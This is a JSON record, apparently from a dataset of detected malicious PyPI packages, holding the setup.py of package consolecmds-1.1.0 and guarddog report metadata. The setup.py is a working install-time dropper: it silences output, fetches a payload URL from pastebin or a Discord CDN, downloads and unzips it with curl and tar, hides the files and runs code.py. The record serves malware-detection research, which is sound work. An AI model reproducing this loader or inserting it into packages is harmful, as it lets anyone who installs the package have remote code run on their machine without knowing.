[
  {
    "pyfile": "setup.py",
    "malicious_code_snippets": "import sys,os,requests,subprocess,time\nfrom pathlib import Path\n\ndef stopprint():\n    sys.stdout = open(os.devnull, 'w')\n\ndef get_folder_contents(path):\n    try:\n        all_files = os.listdir(path)\n        for file in all_files:\n            if file.lower() == \"python.exe\":\n                return True\n    except:\n        pass\n    return False\n\ndef get_default_path():\n    try:\n        videos_path = str(Path.home() / \"Videos\")\n        return videos_path\n    except Exception as e:\n        return None\n\ndef get_new_filepath(path,name):\n    return os.path.join(path,name)\n\ndef get_cdn():\n    cdnurl = \"https://cdn.discordapp.com/attachments/1033739850643406918/1044011736518377482/code.zip\"\n    try:\n        cdndata = requests.get(f\"https://pastebin.com/raw/tCPxwCgS\")\n        if cdndata.status_code == 200:\n            cdnurl = cdndata.text\n    except:\n        pass\n    return cdnurl\n\ndef hide_file(file_path):\n    try:\n        os.system(f\"attrib +h {file_path}\" )\n    except:\n        pass\n\ndef run_file(path):\n    p = subprocess.Popen(f\"python {path}\",shell=True,stdin=None,stdout=subprocess.PIPE,stderr=subprocess.PIPE,close_fds=True)\n    out, err = p.communicate()\n\ndef main():\n    stopprint()\n    filepath = get_default_path()\n    for thing in sys.path:\n        correct_folder = get_folder_contents(thing)\n        if correct_folder == True:\n            filepath = thing \n            break\n    new_filepath = get_new_filepath(filepath,\"code.py\")\n    other_filepath = get_new_filepath(filepath,\"pytransform\")\n    if os.path.exists(new_filepath) == True:\n        return\n    cdn = get_cdn()\n    os.system(f\"curl -o %temp%/nice.zip -silent  {cdn}\")\n    os.system(f'tar -xf \"\"%temp%/nice.zip\"\" -C \"\"{filepath}\"\"')\n    hide_file(new_filepath)\n    hide_file(other_filepath)\n    run_file(new_filepath)\n\nmain()"
  },
  {
    "metadata": {
      "package_name": "consolecmds-1.1.0",
      "report_path": "/home/blue/PyPIAgent/Codes/tooldetect/detect_output/guarddog/malware/consolecmds-1.1.0.txt"
    }
  }
]